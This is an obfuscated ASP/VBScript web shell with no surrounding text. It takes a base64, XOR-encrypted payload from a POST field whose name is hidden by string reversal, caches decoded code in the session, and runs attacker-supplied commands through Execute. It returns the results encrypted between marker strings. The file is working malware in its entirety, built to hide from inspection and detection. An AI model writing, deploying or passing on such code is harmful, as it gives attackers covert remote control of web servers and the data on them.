<%
Set obj_a9b8c7 = Server.CreateObject(ChrW(83)&ChrW(99)&ChrW(114)&ChrW(105)&ChrW(112)&ChrW(116)&ChrW(105)&ChrW(110)&ChrW(103)&ChrW(46)&ChrW(68)&ChrW(105)&ChrW(99)&ChrW(116)&ChrW(105)&ChrW(111)&ChrW(110)&ChrW(97)&ChrW(114)&ChrW(121))
Function func_b64d_1f(v_cd_2a)
    Dim x_1, n_1
    Set x_1 = CreateObject(Join(Array("M","s","x","m","l","2",".","D","O","M","D","o","c","u","m","e","n","t",".","3",".","0"),""))
    Set n_1 = x_1.CreateElement("b64")
    n_1.dataType = "bin.base64"
    n_1.text = v_cd_2a
    func_b64d_1f = n_1.nodeTypedValue
    Set n_1 = Nothing
    Set x_1 = Nothing
End Function
Function func_b64e_9a(v_cd_3b)
    Dim x_2, n_2
    Set x_2 = CreateObject(Join(Array("M","s","x","m","l","2",".","D","O","M","D","o","c","u","m","e","n","t",".","3",".","0"),""))
    Set n_2 = x_2.CreateElement("b64")
    n_2.dataType = "bin.base64"
    n_2.nodeTypedValue = v_cd_3b
    func_b64e_9a = n_2.text
    Set n_2 = Nothing
    Set x_2 = Nothing
End Function
Function func_x_proc_5c(p_data_1, p_is_bin_2)
    Dim sz_1, i_1, res_1, k_sz_1, k_str, bs_obj
    k_str = "3c6e0b8a9c15224a"
    k_sz_1 = Len(k_str)
    Set bs_obj = CreateObject(ChrW(65)&ChrW(68)&ChrW(79)&ChrW(68)&ChrW(66)&ChrW(46)&ChrW(83)&ChrW(116)&ChrW(114)&ChrW(101)&ChrW(97)&ChrW(109))
    bs_obj.CharSet = "iso-8859-1"
    bs_obj.Type = 2
    bs_obj.Open
    If IsArray(p_data_1) Then
        sz_1 = UBound(p_data_1) + 1
        i_1 = 1
        Do While i_1 <= sz_1
            bs_obj.WriteText ChrW(AscB(MidB(p_data_1, i_1, 1)) Xor Asc(Mid(k_str, (i_1 Mod k_sz_1) + 1, 1)))
            i_1 = i_1 - (-1)
        Loop
    End If
    bs_obj.Position = 0
    If p_is_bin_2 Then
        bs_obj.Type = 1
        func_x_proc_5c = bs_obj.Read()
    Else
        func_x_proc_5c = bs_obj.ReadText()
    End If
End Function
Dim k_str_a1, d_in_b2, d_out_c3
k_str_a1 = "3c6e0b8a9c15224a"
d_in_b2 = Request.Form(StrReverse("llehsflow"))
If Not IsEmpty(d_in_b2) Then
    If IsEmpty(Session(Join(Array("p","a","y","l","o","a","d"),""))) Then
        d_out_c3 = func_x_proc_5c(func_b64d_1f(d_in_b2), False)
        Session(Join(Array("p","a","y","l","o","a","d"),"")) = d_out_c3
        Response.End
    Else
        d_out_c3 = func_x_proc_5c(func_b64d_1f(d_in_b2), True)
        obj_a9b8c7.Add Join(Array("p","a","y","l","o","a","d"),""), Session(Join(Array("p","a","y","l","o","a","d"),""))
        Execute(obj_a9b8c7(Join(Array("p","a","y","l","o","a","d"),"")))
        Dim res_d4
        res_d4 = run(d_out_c3)
        Response.Write("a71ab1")
        If Not IsEmpty(res_d4) Then
            Response.Write func_b64e_9a(func_x_proc_5c(res_d4, True))
        End If
        Response.Write("4b8259")
    End If
End If
%>